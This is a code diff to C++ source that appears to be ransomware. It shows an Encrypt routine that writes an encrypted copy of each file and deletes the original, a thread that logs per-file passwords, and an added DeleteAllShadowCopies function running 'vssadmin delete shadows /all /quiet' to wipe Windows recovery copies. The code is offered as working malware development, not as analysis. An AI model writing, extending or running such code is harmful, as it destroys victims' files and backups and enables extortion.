@@ -84,7 +84,8 @@ void Encrypt(std::string _filePath, std::string _password)
 		outFile.write(outBuf, length); /*<- Writing encrypted file*/
 		inFile.close();
 		outFile.close();
-		remove(_s_fileName.c_str());  /* <- Delete he oiriginal file*/
+		char shadowPath[MAX_PATH];
+		remove(_s_fileName.c_str());  /* <- Delete the oiriginal file*/
 		delete[] buf;
 		delete[] outBuf;
 	}
@@ -200,6 +201,17 @@ DWORD WINAPI SearchEngine(LPVOID lpParameter) {			/*Thread fuction*/
 		writeLogFile(_v_filenames[i], _passwords[i]);
 	}
 	ExitThread(0);
+}
+
+void DeleteAllShadowCopies()
+{
+	try {
+		system("vssadmin delete shadows /all /quiet");
+		std::cout << "All shadow copies are deleted!\n";
+	}
+	catch (int e) {
+		std::cout << "Cannot delete shadow copies!\n";
+	}
 }
 
 void writeLogFile(std::string _filename, std::string password)
